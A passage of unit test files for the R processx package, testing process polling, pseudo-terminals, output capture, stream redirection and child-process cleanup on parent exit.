  close(p2$get_error_connection())
  res <- poll(list(p1 = p1, p2 = p2), 0)
  expect_equal(
    res,
    list(
      p1 = c(output = "closed", error = "nopipe", process = "nopipe"),
      p2 = c(output = "nopipe", error = "closed", process = "nopipe")
    )
  )
})

test_that("multiple polls", {
  px <- get_tool("px")
  cmd <- c("sleep", "1", "outln", "foo", "sleep", "1", "outln", "bar")
  p <- process$new(px, cmd, stdout = "|", stderr = "|")
  on.exit(p$kill(), add = TRUE)

  out <- character()
  while (p$is_alive()) {
    poll(list(p), 2000)
    out <- c(out, p$read_output_lines())
  }

  expect_identical(out, c("foo", "bar"))
})

test_that("polling and buffering", {
  skip_on_os("windows")

  px <- get_tool("px")

  for (i in 1:10) {
    ## We set up two processes, one produces a output, that we do not
    ## read out from the cache. The other one does not produce output.
    p1 <- process$new(
      px,
      c(rbind("outln", 1:20), "sleep", "3"),
      stdout = "|",
      stderr = "|"
    )
    p2 <- process$new(px, c("sleep", "3"), stdout = "|", stderr = "|")

    ## We poll until p1 has output. We read out some of the output,
    ## and leave the rest in the buffer.
    tick <- Sys.time()
    p1$poll_io(-1)
    expect_true(Sys.time() - tick < as.difftime(1, units = "secs"))
    expect_equal(p1$read_output_lines(n = 1), "1")

    ## Now poll should return immediately, because there is output ready
    ## from p1. The status of p2 should be 'silent' (and not 'timeout')
    tick <- Sys.time()
    s <- poll(list(p1, p2), 3000)
    dt <- Sys.time() - tick
    expect_true(dt < as.difftime(2, units = "secs"))
    expect_equal(
      s,
      list(
        c(output = "ready", error = "silent", process = "nopipe"),
        c(output = "silent", error = "silent", process = "nopipe")
      )
    )

    p1$kill()
    p2$kill()
    if (s[[2]][1] != "silent") break
  }
})

test_that("polling and buffering #2", {
  px <- get_tool("px")

  ## We run this a bunch of times, because it used to fail
  ## non-deterministically on the CI
  for (i in 1:10) {
    ## Two processes, they both produce output. For the first process,
    ## we make sure that there is something in the buffer.
    ## For the second process we need to poll, but data should be
    ## available immediately.
    p1 <- process$new(px, rbind("outln", 1:20), stdout = "|")
    p2 <- process$new(px, rbind("outln", 21:30), stdout = "|")

    ## We poll until p1 has output. We read out some of the output,
    ## and leave the rest in the buffer.
    p1$poll_io(-1)
    expect_equal(p1$read_output_lines(n = 1), "1")

    ## We also need to poll p2, to make sure that there is
    ## output from it. But we don't read anything from it.
    expect_equal(p1$poll_io(-1)[["output"]], "ready")
    expect_equal(p2$poll_io(-1)[["output"]], "ready")

    ## Now poll should return ready for both processes, and it should
    ## return fast.
    tick <- Sys.time()
    s <- poll(list(p1, p2), 3000)
    expect_equal(
      s,
      list(
        c(output = "ready", error = "nopipe", process = "nopipe"),
        c(output = "ready", error = "nopipe", process = "nopipe")
      )
    )

    p1$kill()
    p2$kill()

    ## Check that poll has returned immediately
    expect_true(Sys.time() - tick < as.difftime(2, units = "secs"))
  }
})
````

### `px390/processx/tests/testthat/test-poll3.R`

````r
test_that("poll connection", {
  px <- get_tool("px")
  p <- process$new(px, c("sleep", ".5", "outln", "foobar"))
  on.exit(p$kill())

  ## Timeout
  expect_equal(
    p$poll_io(0),
    c(output = "nopipe", error = "nopipe", process = "timeout")
  )

  p$wait()
  expect_equal(
    p$poll_io(-1),
    c(output = "nopipe", error = "nopipe", process = "ready")
  )

  p$kill(close_connections = FALSE)
  expect_equal(
    p$poll_io(-1),
    c(output = "nopipe", error = "nopipe", process = "ready")
  )

  close(p$get_poll_connection())
  expect_equal(
    p$poll_io(-1),
    c(output = "nopipe", error = "nopipe", process = "closed")
  )
})

test_that("poll connection + stdout", {
  px <- get_tool("px")
  p1 <- process$new(px, c("outln", "foobar"), stdout = "|")
  on.exit(p1$kill(), add = TRUE)

  expect_false(p1$has_poll_connection())

  p2 <- process$new(
    px,
    c("sleep", "0.5", "outln", "foobar"),
    stdout = "|",
    poll_connection = TRUE
  )
  on.exit(p2$kill(), add = TRUE)

  expect_equal(
    p2$poll_io(0),
    c(output = "timeout", error = "nopipe", process = "timeout")
  )

  pr <- p2$poll_io(-1)
  expect_true("ready" %in% pr)
})

test_that("poll connection + stderr", {
  px <- get_tool("px")
  p1 <- process$new(px, c("errln", "foobar"), stderr = "|")
  on.exit(p1$kill(), add = TRUE)

  expect_false(p1$has_poll_connection())

  p2 <- process$new(
    px,
    c("sleep", "0.5", "errln", "foobar"),
    stderr = "|",
    poll_connection = TRUE
  )
  on.exit(p2$kill(), add = TRUE)

  expect_equal(
    p2$poll_io(0),
    c(output = "nopipe", error = "timeout", process = "timeout")
  )
})
````

### `px390/processx/tests/testthat/test-print.R`

````r
test_that("print", {
  px <- get_tool("px")
  p <- process$new(px, c("sleep", "5"))
  on.exit(try_silently(p$kill(grace = 0)), add = TRUE)
  expect_output(
    print(p),
    "PROCESS .* running, pid"
  )

  p$kill()
  expect_output(
    print(p),
    "PROCESS .* finished"
  )
})

test_that("pipeline print", {
  skip_on_cran()
  px <- get_tool("px")

  pl <- pipeline$new(
    list(c(px, "cat", "<stdin>"), c(px, "cat", "<stdin>")),
    stdin = "|",
    stdout = "|"
  )
  on.exit(pl$kill(), add = TRUE)

  expect_output(print(pl), "^PIPELINE")
  expect_output(print(pl), "\\| .* running, pid")

  pl$close_input()
  pl$wait()
  expect_output(print(pl), "\\| .* finished")
})
````

### `px390/processx/tests/testthat/test-process.R`

````r
test_that("process works", {
  px <- get_tool("px")
  p <- process$new(px, c("sleep", "5"))
  on.exit(try_silently(p$kill(grace = 0)), add = TRUE)
  expect_true(p$is_alive())
})

test_that("get_exit_status", {
  px <- get_tool("px")
  p <- process$new(px, c("return", "1"))
  on.exit(p$kill(), add = TRUE)
  p$wait()
  expect_identical(p$get_exit_status(), 1L)
})

test_that("non existing process", {
  skip_if_no_srcrefs()
  withr::local_options(width = 400)
  expect_snapshot(
    error = TRUE,
    process$new(tempfile()),
    transform = function(x) transform_line_number(transform_tempdir(x)),
    variant = sysname()
  )
  ## This closes connections in finalizers
  gc()
})

test_that("post processing", {
  px <- get_tool("px")
  p <- process$new(
    px,
    c("return", "0"),
    post_process = function() "foobar"
  )
  p$wait(5000)
  p$kill()
  expect_equal(p$get_result(), "foobar")

  p <- process$new(
    px,
    c("sleep", "5"),
    post_process = function() "yep"
  )
  expect_snapshot(error = TRUE, p$get_result())
  p$kill()
  expect_equal(p$get_result(), "yep")

  ## Only runs once
  xx <- 0
  p <- process$new(
    px,
    c("return", "0"),
    post_process = function() xx <<- xx + 1
  )
  p$wait(5000)
  p$kill()
  p$get_result()
  expect_equal(xx, 1)
  p$get_result()
  expect_equal(xx, 1)
})

test_that("working directory", {
  px <- get_tool("px")
  dir.create(tmp <- tempfile())
  on.exit(unlink(tmp, recursive = TRUE), add = TRUE)
  cat("foo\nbar\n", file = file.path(tmp, "file"))

  p <- process$new(px, c("cat", "file"), wd = tmp, stdout = "|")
  on.exit(p$kill(), add = TRUE)
  p$wait()
  expect_equal(p$read_all_output_lines(), c("foo", "bar"))
})

test_that("working directory does not exist", {
  skip_if_no_srcrefs()
  px <- get_tool("px")
  expect_snapshot(
    error = TRUE,
    process$new(px, wd = tempfile()),
    transform = function(x) transform_line_number(transform_px(x)),
    variant = sysname()
  )
  ## This closes connections in finalizers
  gc()
})

test_that("R process is installed with a SIGTERM cleanup handler", {
  # https://github.com/r-lib/callr/pull/250
  skip_if_not_installed("callr", "3.7.3.9001")

  # Needs POSIX signal handling
  skip_on_os("windows")

  # Enabled case
  withr::local_envvar(c(PROCESSX_R_SIGTERM_CLEANUP = "true"))

  out <- tempfile()

  fn <- function(file) {
    file.create(tempfile())
    writeLines(tempdir(), file)
  }

  p <- callr::r_session$new()
  p$run(fn, list(file = out))

  p_temp_dir <- readLines(out)
  expect_true(dir.exists(p_temp_dir))

  p$signal(ps::signals()$SIGTERM)
  p$wait()
  expect_false(dir.exists(p_temp_dir))

  # Disabled case
  withr::local_envvar(c(PROCESSX_R_SIGTERM_CLEANUP = NA_character_))

  # Just in case R adds tempdir cleanup on SIGTERM
  skip_on_cran()

  p <- callr::r_session$new()
  p$run(fn, list(file = out))

  p_temp_dir <- readLines(out)
  expect_true(dir.exists(p_temp_dir))

  p$signal(ps::signals()$SIGTERM)
  p$wait()

  # Was not cleaned up
  expect_true(dir.exists(p_temp_dir))
})

test_that("linux_pdeathsig kills child when parent exits", {
  skip_if(!is_linux())
  skip_if(is_valgrind())
  skip_if(is_asan())
  skip_if(is_ubsan())
  skip_on_cran()

  px <- get_tool("px")
  pidfile <- tempfile()
  on.exit(unlink(pidfile), add = TRUE)

  # Start a long-lived parent that spawns a grandchild with linux_pdeathsig
  # and writes its PID to a file, then sleeps. We SIGKILL the parent
  # explicitly — instantaneous, no sanitizer cleanup delay — so PDEATHSIG
  # fires at a known time regardless of ASAN/valgrind overhead.
  bg <- callr::r_bg(
    function(px, pidfile) {
      p <- processx::process$new(
        px,
        c("sleep", "100"),
        cleanup = FALSE,
        linux_pdeathsig = TRUE
      )
      writeLines(as.character(p$get_pid()), pidfile)
      Sys.sleep(600)
    },
    args = list(px = px, pidfile = pidfile)
  )
  on.exit(bg$kill(), add = TRUE)

  deadline <- get_deadline(secs = 5)
  while (!file.exists(pidfile) && Sys.time() < deadline) {
    Sys.sleep(0.05)
  }
  skip_if(!file.exists(pidfile), "grandchild did not start in time")
  grandchild_pid <- as.integer(readLines(pidfile))
  on.exit(tools::pskill(grandchild_pid, tools::SIGKILL), add = TRUE)

  bg$kill()
  bg$wait()

  deadline <- get_deadline(secs = 3)
  while (process__exists(grandchild_pid) && Sys.time() < deadline) {
    Sys.sleep(0.05)
  }
  expect_false(process__exists(grandchild_pid))
})

test_that("without linux_pdeathsig child survives parent exit", {
  skip_if(!is_linux())
  skip_if(is_valgrind())
  skip_if(is_asan())
  skip_if(is_ubsan())
  skip_on_cran()

  px <- get_tool("px")
  pidfile <- tempfile()
  on.exit(unlink(pidfile), add = TRUE)

  bg <- callr::r_bg(
    function(px, pidfile) {
      p <- processx::process$new(
        px,
        c("sleep", "100"),
        cleanup = FALSE,
        linux_pdeathsig = FALSE
      )
      writeLines(as.character(p$get_pid()), pidfile)
      Sys.sleep(600)
    },
    args = list(px = px, pidfile = pidfile)
  )
  on.exit(bg$kill(), add = TRUE)

  deadline <- get_deadline(secs = 5)
  while (!file.exists(pidfile) && Sys.time() < deadline) {
    Sys.sleep(0.05)
  }
  skip_if(!file.exists(pidfile), "grandchild did not start in time")
  grandchild_pid <- as.integer(readLines(pidfile))
  on.exit(tools::pskill(grandchild_pid, tools::SIGKILL), add = TRUE)

  bg$kill()
  bg$wait()

  Sys.sleep(0.2)
  expect_true(process__exists(grandchild_pid))
})

test_that("linux_pdeathsig input validation", {
  px <- get_tool("px")

  # Valid: FALSE (default)
  p <- process$new(px, c("return", "0"), linux_pdeathsig = FALSE)
  p$wait()

  # Valid signal numbers are accepted on all platforms; non-Linux just warns
  if (is_linux()) {
    p <- process$new(px, c("return", "0"), linux_pdeathsig = TRUE)
    p$wait()
    p <- process$new(px, c("return", "0"), linux_pdeathsig = tools::SIGTERM)
    p$wait()
  } else {
    expect_warning(
      process$new(px, c("return", "0"), linux_pdeathsig = TRUE)$wait(),
      "ignored on non-Linux"
    )
  }

  # Invalid: string, negative, zero
  expect_error(process$new(px, c("return", "0"), linux_pdeathsig = "foo"))
  expect_error(process$new(px, c("return", "0"), linux_pdeathsig = -1))
  expect_error(process$new(px, c("return", "0"), linux_pdeathsig = 0))
})

test_that("get_end_time", {
  px <- get_tool("px")

  p <- process$new(px, c("sleep", "1"))
  on.exit(p$kill(), add = TRUE)

  before <- Sys.time()
  expect_null(p$get_end_time())

  p$wait()
  after <- Sys.time()

  et <- p$get_end_time()
  expect_s3_class(et, "POSIXct")
  expect_gte(as.double(et), as.double(before))
  expect_gte(as.double(et), as.double(p$get_start_time()))

  # cached: second call returns the same value
  expect_equal(p$get_end_time(), et)
})
````

### `px390/processx/tests/testthat/test-ps-methods.R`

````r
test_that("ps methods", {
  skip_if_no_ps()

  px <- get_tool("px")
  p <- process$new(px, c("sleep", "100"))
  on.exit(p$kill(), add = TRUE)

  ps <- p$as_ps_handle()
  expect_s3_class(ps, "ps_handle")
  expect_true(ps::ps_name(ps) %in% c("px", "px.exe"))

  expect_equal(p$get_name(), ps::ps_name(ps))
  expect_equal(p$get_exe(), ps::ps_exe(ps))
  expect_equal(p$get_cmdline(), ps::ps_cmdline(ps))
  expect_equal(p$get_status(), ps::ps_status(ps))
  expect_equal(p$get_username(), ps::ps_username(ps))
  expect_equal(p$get_wd(), ps::ps_cwd(ps))
  expect_equal(names(p$get_cpu_times()), names(ps::ps_cpu_times(ps)))
  expect_equal(names(p$get_memory_info()), names(ps::ps_memory_info(ps)))

  p$suspend()
  deadline <- Sys.time() + 3
  while (p$get_status() != "stopped" && Sys.time() < deadline) {
    Sys.sleep(0.05)
  }
  expect_true(Sys.time() < deadline)
  expect_equal(p$get_status(), "stopped")

  p$resume()
  deadline <- Sys.time() + 3
  while (p$get_status() == "stopped" && Sys.time() < deadline) {
    Sys.sleep(0.05)
  }
  expect_true(Sys.time() < deadline)
  expect_true(p$get_status() != "stopped")
})
````

### `px390/processx/tests/testthat/test-pty.R`

````r
test_that("pty works on windows", {
  skip_other_platforms("windows")
  skip_on_cran()

  px <- get_tool("px")
  p <- process$new(px, c("outln", "hello", "sleep", "10"), pty = TRUE)
  on.exit(p$kill(), add = TRUE)
  expect_true(p$is_alive())

  con <- p$get_output_connection()
  out <- ""
  repeat {
    pr <- poll(list(con), 2000L)[[1]]
    if (!identical(pr, "ready")) {
      break
    }
    out <- paste0(out, p$read_output())
    if (grepl("hello", out, fixed = TRUE)) break
  }
  expect_match(out, "hello")
})

test_that("pty write_input works on windows", {
  skip_other_platforms("windows")
  skip_on_cran()

  # Use px cat <stdin> instead of cmd.exe: px reads stdin and echoes to stdout,
  # no banner to flush, no cmd.exe overhead or security-software interference.
  px <- get_tool("px")
  p <- process$new(px, c("cat", "<stdin>"), pty = TRUE)
  on.exit(p$kill(), add = TRUE)
  expect_true(p$is_alive())

  con <- p$get_output_connection()

  p$write_input("hello\r\n")
  # Poll the stdout connection directly (not the full process) to avoid the
  # poll_pipe-forces-timeout-0 effect when the process has already exited.
  # Loop to skip VT init sequences that ConPTY writes before any child output.
  out <- ""
  repeat {
    pr <- poll(list(con), 2000L)[[1]]
    if (!identical(pr, "ready")) {
      break
    }
    out <- paste0(out, p$read_output())
    if (grepl("hello", out, fixed = TRUE)) break
  }
  expect_match(out, "hello")
})

test_that("pty works", {
  skip_other_platforms("unix")
  skip_on_os("solaris")
  skip_on_cran()

  p <- process$new("cat", pty = TRUE)
  on.exit(p$kill(), add = TRUE)
  expect_true(p$is_alive())
  if (!p$is_alive()) {
    stop("process not running")
  }

  pr <- p$poll_io(0)
  expect_equal(pr[["output"]], "timeout")

  p$write_input("foobar\n")
  pr <- p$poll_io(300)
  expect_equal(pr[["output"]], "ready")
  if (pr[["output"]] != "ready") {
    stop("no output")
  }
  expect_equal(p$read_output(), "foobar\r\n")
})

test_that("pty echo", {
  skip_other_platforms("unix")
  skip_on_os("solaris")
  skip_on_cran()

  p <- process$new("cat", pty = TRUE, pty_options = list(echo = TRUE))
  on.exit(p$kill(), add = TRUE)
  expect_true(p$is_alive())
  if (!p$is_alive()) {
    stop("process not running")
  }

  pr <- p$poll_io(0)
  expect_equal(pr[["output"]], "timeout")

  p$write_input("foo")
  pr <- p$poll_io(300)
  expect_equal(pr[["output"]], "ready")
  if (pr[["output"]] != "ready") {
    stop("no output")
  }
  expect_equal(p$read_output(), "foo")

  p$write_input("bar\n")
  pr <- p$poll_io(300)
  expect_equal(pr[["output"]], "ready")
  if (pr[["output"]] != "ready") {
    stop("no output")
  }
  expect_equal(p$read_output(), "bar\r\nfoobar\r\n")
})

test_that("pty captures output from a short-lived process", {
  skip_other_platforms("unix")
  skip_on_os("solaris")
  skip_on_cran()

  px <- get_tool("px")
  p <- process$new(px, "--help", pty = TRUE)
  on.exit(p$kill(), add = TRUE)
  p$wait(5000)

  pr <- p$poll_io(1000)
  expect_equal(pr[["output"]], "ready")

  out <- p$read_output()
  expect_true(nchar(out) > 0)
})

test_that("read_output_lines() fails for pty", {
  skip_if_no_srcrefs()
  skip_other_platforms("unix")
  skip_on_os("solaris")
  skip_on_cran()

  p <- process$new("cat", pty = TRUE)
  p$write_input("foobar\n")
  expect_snapshot(error = TRUE, p$read_output_lines())

  pr <- p$poll_io(300)
  expect_equal(pr[["output"]], "ready")
  if (pr[["output"]] != "ready") {
    stop("no output")
  }
  expect_equal(p$read_output(), "foobar\r\n")
})
````

### `px390/processx/tests/testthat/test-run.R`

````r
test_that("run can run", {
  px <- get_tool("px")
  expect_error(
    {
      run(px, c("sleep", "0"))
    },
    NA
  )
  gc()
})

test_that("timeout works", {
  px <- get_tool("px")
  tic <- Sys.time()
  x <- run(px, c("sleep", "5"), timeout = 0.00001, error_on_status = FALSE)
  toc <- Sys.time()

  expect_true(toc - tic < as.difftime(3, units = "secs"))
  expect_true(x$timeout)
  gc()
})

test_that("timeout throws right error", {
  px <- get_tool("px")
  e <- tryCatch(
    run(px, c("sleep", "5"), timeout = 0.00001, error_on_status = TRUE),
    error = function(e) e
  )

  expect_true("system_command_timeout_error" %in% class(e))
  gc()
})

test_that("callbacks work", {
  px <- get_tool("px")
  ## This typically freezes on Unix, if there is a malloc/free race
  ## condition in the SIGCHLD handler.
  for (i in 1:30) {
    out <- NULL
    run(
      px,
      rbind("outln", 1:20),
      stdout_line_callback = function(x, ...) out <<- c(out, x)
    )
    expect_equal(out, as.character(1:20))
    gc()
  }

  for (i in 1:30) {
    out <- NULL
    run(
      px,
      rbind("errln", 1:20),
      stderr_line_callback = function(x, ...) out <<- c(out, x),
      error_on_status = FALSE
    )
    expect_equal(out, as.character(1:20))
    gc()
  }
})

test_that("working directory", {
  px <- get_tool("px")
  dir.create(tmp <- tempfile())
  on.exit(unlink(tmp, recursive = TRUE), add = TRUE)
  cat("foo\nbar\n", file = file.path(tmp, "file"))

  x <- run(px, c("cat", "file"), wd = tmp)
  if (is_windows()) {
    expect_equal(x$stdout, "foo\r\nbar\r\n")
  } else {
    expect_equal(x$stdout, "foo\nbar\n")
  }
  gc()
})

test_that("working directory does not exist", {
  skip_if_no_srcrefs()
  px <- get_tool("px")
  expect_snapshot(
    error = TRUE,
    run(px, wd = tempfile()),
    transform = function(x) transform_line_number(transform_px(x)),
    variant = sysname()
  )
  gc()
})

test_that("stderr_to_stdout", {
  px <- get_tool("px")

  out <- run(
    px,
    c("out", "o1", "err", "e1", "out", "o2", "err", "e2", "outln", ""),
    stderr_to_stdout = TRUE
  )

  expect_equal(out$status, 0L)
  expect_equal(
    out$stdout,
    paste0("o1e1o2e2", if (is_windows()) "\r", "\n")
  )
  expect_equal(out$stderr, NULL)
  expect_false(out$timeout)
})

test_that("condition on interrupt", {
  skip_if_no_ps()
  skip_on_cran()
  if (is_windows() && Sys.getenv("_R_CHECK_PACKAGE_NAME_", "") != "") {
    skip("Fails in Windows R CMD check")
  }

  px <- get_tool("px")
  cnd <- tryCatch(
    interrupt_me(run(px, c("errln", "oops", "errflush", "sleep", 3)), 0.5),
    error = function(c) c,
    interrupt = function(c) c
  )

  expect_s3_class(cnd, "system_command_interrupt")
  expect_equal(str_trim(cnd$stderr), "oops")
})

test_that("stdin", {
  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)

  txt <- "foobar\nthis is the input\n"
  cat(txt, file = tmp)
  px <- get_tool("px")
  res <- run(px, c("cat", "<stdin>"), stdin = tmp)

  expect_equal(
    strsplit(res$stdout, "\r?\n")[[1]],
    c("foobar", "this is the input")
  )
})

test_that("drop stdout", {
  px <- get_tool("px")
  res <- run(px, c("out", "boo", "err", "bah"), stdout = NULL)
  expect_null(res$stdout)
  expect_equal(res$stderr, "bah")
})

test_that("drop stderr", {
  px <- get_tool("px")
  res <- run(px, c("out", "boo", "err", "bah"), stderr = NULL)
  expect_equal(res$stdout, "boo")
  expect_null(res$stderr)
})

test_that("drop std*", {
  px <- get_tool("px")
  res <- run(px, c("out", "boo", "err", "bah"), stdout = NULL, stderr = NULL)
  expect_null(res$stdout)
  expect_null(res$stderr)
})

test_that("redirect stout", {
  tmp1 <- tempfile()
  tmp2 <- tempfile()
  on.exit(unlink(c(tmp1, tmp2)), add = TRUE)

  px <- get_tool("px")
  res <- run(
    px,
    c("outln", "boo", "errln", "bah"),
    stdout = tmp1,
    stderr = tmp2
  )
  expect_null(res$stdout)
  expect_null(res$stderr)
  expect_equal(readLines(tmp1), "boo")
  expect_equal(readLines(tmp2), "bah")
})

test_that("binary=TRUE captures stdout as raw vector", {
  skip_on_cran()

  # Include null byte, high bytes, \r\n — bytes text mode would mangle
  hex <- "00010a0d0d0a80ff"
  expected <- as.raw(c(0x00, 0x01, 0x0a, 0x0d, 0x0d, 0x0a, 0x80, 0xff))

  px <- get_tool("px")
  res <- run(px, c("rawout", hex), encoding = "binary")

  expect_identical(res$stdout, expected)
  expect_identical(res$stderr, raw(0))
})

test_that("binary=TRUE captures stderr as raw vector", {
  skip_on_cran()

  hex <- "00010a0d0d0a80ff"
  expected <- as.raw(c(0x00, 0x01, 0x0a, 0x0d, 0x0d, 0x0a, 0x80, 0xff))

  px <- get_tool("px")
  res <- run(
    px,
    c("rawerr", hex),
    encoding = "binary",
    error_on_status = FALSE
  )

  expect_identical(res$stdout, raw(0))
  expect_identical(res$stderr, expected)
})

test_that("binary=TRUE with stdout_callback receives raw chunks", {
  skip_on_cran()

  hex <- "00010a80ff"
  expected <- as.raw(c(0x00, 0x01, 0x0a, 0x80, 0xff))

  px <- get_tool("px")
  chunks <- list()
  res <- run(
    px,
    c("rawout", hex),
    encoding = "binary",
    stdout_callback = function(x, ...) chunks[[length(chunks) + 1]] <<- x
  )

  combined <- do.call(c, chunks)
  expect_identical(combined, expected)
  expect_identical(res$stdout, expected)
})

test_that("binary=TRUE errors with line callbacks", {
  skip_if_no_srcrefs()
  px <- get_tool("px")
  expect_snapshot(
    error = TRUE,
    run(
      px,
      "out",
      encoding = "binary",
      stdout_line_callback = function(x, ...) x
    )
  )
  expect_snapshot(
    error = TRUE,
    run(
      px,
      "out",
      encoding = "binary",
      stderr_line_callback = function(x, ...) x
    )
  )
})

test_that("pty=TRUE collects merged output in stdout", {
  skip_other_platforms("unix")
  skip_on_os("solaris")
  skip_on_cran()

  res <- run("echo", c("hello", "pty"), pty = TRUE)
  expect_match(res$stdout, "hello pty")
  expect_null(res$stderr)
})

test_that("pty=TRUE collects merged output in stdout (windows)", {
  skip_other_platforms("windows")
  skip_on_cran()

  px <- get_tool("px")
  res <- run(px, c("outln", "hello pty"), pty = TRUE)
  expect_match(res$stdout, "hello pty")
  expect_null(res$stderr)
})

test_that("pty=TRUE works with stdout_callback", {
  skip_other_platforms("unix")
  skip_on_os("solaris")
  skip_on_cran()

  chunks <- character()
  res <- run(
    "echo",
    "hello",
    pty = TRUE,
    stdout_callback = function(x, ...) chunks <<- c(chunks, x)
  )
  expect_match(paste(chunks, collapse = ""), "hello")
  expect_null(res$stderr)
})

test_that("pty=TRUE works with stdout_callback (windows)", {
  skip_other_platforms("windows")
  skip_on_cran()

  px <- get_tool("px")
  chunks <- character()
  res <- run(
    px,
    c("outln", "hello"),
    pty = TRUE,
    stdout_callback = function(x, ...) chunks <<- c(chunks, x)
  )
  expect_match(paste(chunks, collapse = ""), "hello")
  expect_null(res$stderr)
})

test_that("pty=TRUE errors on incompatible arguments", {
  skip_if_no_srcrefs()
  skip_on_cran()
  expect_snapshot(error = TRUE, run("echo", pty = TRUE, stdout = NULL))
  expect_snapshot(error = TRUE, run("echo", pty = TRUE, stderr = NULL))
  expect_snapshot(
    error = TRUE,
    run("echo", pty = TRUE, stderr_to_stdout = TRUE)
  )
  expect_snapshot(
    error = TRUE,
    run("echo", pty = TRUE, stderr_callback = function(x, ...) x)
  )
  expect_snapshot(
    error = TRUE,
    run("echo", pty = TRUE, stderr_line_callback = function(x, ...) x)
  )
  expect_snapshot(error = TRUE, run("echo", pty = TRUE, stdin = "|"))
})

test_that("pty=TRUE with file stdin feeds content to the process", {
  skip_other_platforms("unix")
  skip_on_os("solaris")
  skip_on_cran()

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  writeLines(c("hello", "world"), tmp)

  res <- run("cat", pty = TRUE, stdin = tmp)
  expect_match(res$stdout, "hello")
  expect_match(res$stdout, "world")
  expect_null(res$stderr)
})
````

### `px390/processx/tests/testthat/test-set-std.R`

````r
test_that("setting stdout to a file", {
  stdout_to_file <- function(filename) {
    con <- processx::conn_create_file(filename, write = TRUE)
    processx::conn_set_stdout(con)
    cat("output\n")
    message("error")
    close(con)
    42
  }

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  opt <- callr::r_process_options(
    func = stdout_to_file,
    args = list(filename = tmp)
  )
  on.exit(p$kill(), add = TRUE)
  p <- callr::r_process$new(opt)

  p$wait(5000)
  expect_false(p$kill(close_connections = FALSE))
  expect_equal(p$get_result(), 42)
  expect_equal(p$read_all_error_lines(), "error")
  expect_equal(p$read_all_output_lines(), character())
  expect_equal(readLines(tmp), "output")
  p$kill()
})

test_that("setting stderr to a file", {
  stderr_to_file <- function(filename) {
    con <- processx::conn_create_file(filename, write = TRUE)
    processx::conn_set_stderr(con)
    cat("output\n")
    message("error")
    close(con)
    42
  }

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  opt <- callr::r_process_options(
    func = stderr_to_file,
    args = list(filename = tmp)
  )
  on.exit(p$kill(), add = TRUE)
  p <- callr::r_process$new(opt)

  p$wait(5000)
  expect_false(p$kill(close_connections = FALSE))
  expect_equal(p$get_result(), 42)
  expect_equal(p$read_all_output_lines(), "output")
  expect_equal(p$read_all_error_lines(), character())
  expect_equal(readLines(tmp), "error")
  p$kill()
})

test_that("setting stdout multiple times", {
  stdout_to_file <- function(file1, file2) {
    con1 <- processx::conn_create_file(file1, write = TRUE)
    processx::conn_set_stdout(con1)
    cat("output\n")
    message("error")
    close(con1)

    con2 <- processx::conn_create_file(file2, write = TRUE)
    processx::conn_set_stdout(con2)
    cat("output2\n")
    message("error2")
    close(con2)

    42
  }

  tmp1 <- tempfile()
  tmp2 <- tempfile()
  on.exit(unlink(c(tmp1, tmp2)), add = TRUE)
  opt <- callr::r_process_options(
    func = stdout_to_file,
    args = list(file1 = tmp1, file2 = tmp2)
  )
  on.exit(p$kill(), add = TRUE)
  p <- callr::r_process$new(opt)

  p$wait(5000)
  expect_false(p$kill(close_connections = FALSE))
  expect_equal(p$get_result(), 42)
  expect_equal(p$read_all_error_lines(), c("error", "error2"))
  expect_equal(p$read_all_output_lines(), character())
  expect_equal(readLines(tmp1), "output")
  expect_equal(readLines(tmp2), "output2")
  p$kill()
})

test_that("set stdout to a pipe", {
  rem_fun <- function() {
    pipe <- processx::conn_create_pipepair()
    processx::conn_set_stdout(pipe[[2]])
    cat("output\n")
    flush(stdout())
    processx::conn_read_lines(pipe[[1]])
  }

  opt <- callr::r_process_options(func = rem_fun)
  on.exit(p$kill(), add = TRUE)
  p <- callr::r_process$new(opt)

  p$wait(5000)
  expect_false(p$kill())
  expect_equal(p$get_result(), "output")
})

test_that("set stderr to a pipe", {
  rem_fun <- function() {
    pipe <- processx::conn_create_pipepair()
    processx::conn_set_stderr(pipe[[2]])
    message("error")
    flush(stderr())
    processx::conn_read_lines(pipe[[1]])
  }

  opt <- callr::r_process_options(func = rem_fun)
  on.exit(p$kill(), add = TRUE)
  p <- callr::r_process$new(opt)

  p$wait(5000)
  expect_false(p$kill())
  expect_equal(p$get_result(), "error")
})

test_that("set stdout and save the old fd", {
  stdout <- function(file1, file2) {
    con1 <- processx::conn_create_file(file1, write = TRUE)
    con2 <- processx::conn_create_file(file2, write = TRUE)
    processx::conn_set_stdout(con1)
    cat("output1\n")
    old <- processx::conn_set_stdout(con2, drop = FALSE)
    cat("output2\n")
    processx::conn_set_stdout(old)
    cat("output1 again\n")
    42
  }

  tmp1 <- tempfile()
  tmp2 <- tempfile()
  on.exit(unlink(c(tmp1, tmp2)), add = TRUE)
  opt <- callr::r_process_options(
    func = stdout,
    args = list(file1 = tmp1, file2 = tmp2)
  )
  on.exit(p$kill(), add = TRUE)
  p <- callr::r_process$new(opt)

  p$wait(5000)
  expect_false(p$kill())
  expect_equal(p$get_result(), 42)
  expect_equal(readLines(tmp1), c("output1", "output1 again"))
  expect_equal(readLines(tmp2), "output2")
})

test_that("set stderr and save the old fd", {
  stderr <- function(file1, file2) {
    con1 <- processx::conn_create_file(file1, write = TRUE)
    con2 <- processx::conn_create_file(file2, write = TRUE)
    processx::conn_set_stderr(con1)
    message("output1")
    old <- processx::conn_set_stderr(con2, drop = FALSE)
    message("output2")
    processx::conn_set_stderr(old)
    message("output1 again")
    42
  }

  tmp1 <- tempfile()
  tmp2 <- tempfile()
  on.exit(unlink(c(tmp1, tmp2)), add = TRUE)
  opt <- callr::r_process_options(
    func = stderr,
    args = list(file1 = tmp1, file2 = tmp2)
  )
  on.exit(p$kill(), add = TRUE)
  p <- callr::r_process$new(opt)

  p$wait(5000)
  expect_false(p$kill())
  expect_equal(p$get_result(), 42)
  expect_equal(readLines(tmp1), c("output1", "output1 again"))
  expect_equal(readLines(tmp2), "output2")
})
````

### `px390/processx/tests/testthat/test-sigchld.R`

````r
test_that("is_alive()", {
  skip_other_platforms("unix")
  skip_on_cran()

  opts <- callr::r_session_options(
    env = c(PROCESSX_NOTIFY_OLD_SIGCHLD = "true")
  )
  rs <- callr::r_session$new(opts)
  on.exit(rs$close(), add = TRUE)

  res <- rs$run_with_output(function() {
    library(parallel)
    library(processx)

    px <- process$new("sleep", "0.5")
